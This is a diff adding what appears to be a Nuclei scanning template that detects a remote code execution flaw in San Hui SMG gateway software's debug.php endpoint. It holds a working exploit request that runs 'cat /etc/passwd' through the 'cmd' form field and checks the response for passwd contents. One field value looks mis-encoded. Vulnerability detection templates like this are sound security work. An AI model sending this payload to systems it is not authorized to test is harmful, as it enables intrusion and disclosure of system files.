@@ -1,0 +1,47 @@
+id: san-hui-smg-gateway-management-software-debug-php-rce
+info:
+  name: 三汇SMG 网关管理软件 debug.php 远程代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template identifies a Remote Code Execution (RCE) vulnerability in San Hui SMG Gateway Management Software via the debug.php endpoint.
+  tags: rce
+http:
+  - raw:
+      - |
+        POST /debug.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7KggIe3eNBrlFMkW
+
+        ------WebKitFormBoundary7KggIe3eNBrlFMkW
+        Content-Disposition: form-data; name="comdtype"
+
+        1
+        ------WebKitFormBoundary7KggIe3eNBrlFMkW
+        Content-Disposition: form-data; name="cmd"
+
+        cat /etc/passwd
+        ------WebKitFormBoundary7KggIe3eNBrlFMkW
+        Content-Disposition: form-data; name="run"
+
+        ?ц?
+        ------WebKitFormBoundary7KggIe3eNBrlFMkW
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+          - "命令执行"
+      - type: word
+        part: header
+        words:
+          - "text/html"
+      - type: regex
+        part: body
+        regex:
+          - "<title>.*后台调试.*</title>"
